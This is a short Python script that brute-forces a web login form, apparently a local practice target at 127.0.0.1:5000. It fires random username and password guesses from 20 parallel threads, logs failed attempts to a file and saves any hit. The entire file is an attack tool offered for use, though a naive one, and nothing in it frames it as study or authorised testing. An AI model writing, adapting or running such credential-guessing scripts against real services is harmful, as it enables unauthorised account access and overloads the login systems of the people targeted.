import requests
import itertools
import string
import random
import threading

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password):
    attempt = {'username': username, 'password': password}
    r = requests.post(url, data=attempt)
    return r.status_code == 200

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

def main():
    while True:
        valid = False
        while not valid:
            generate_username = random.choices(characters, k=random.randint(8, 20))
            username = "".join(generate_username)
            generate_password = random.choices(characters, k=random.randint(8, 20))
            password = "".join(generate_password)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if password in tries:
                pass
            else:
                valid = True

        if attempt_login(username, password):
            print(f"Success! Username: {username}, Password: {password}")
            with open("correct_password.txt", "w") as f:
                f.write(f"{username} , {password}\n")
                f.close()
            exit()
        else:
            with open("tries.txt", "a") as f:
                f.write(f"{username} , {password}\n")
                f.close()
            print(f"Wrong! Username: {username}, Password: {password}")


for x in range(20):
    threading.Thread(target=main).start()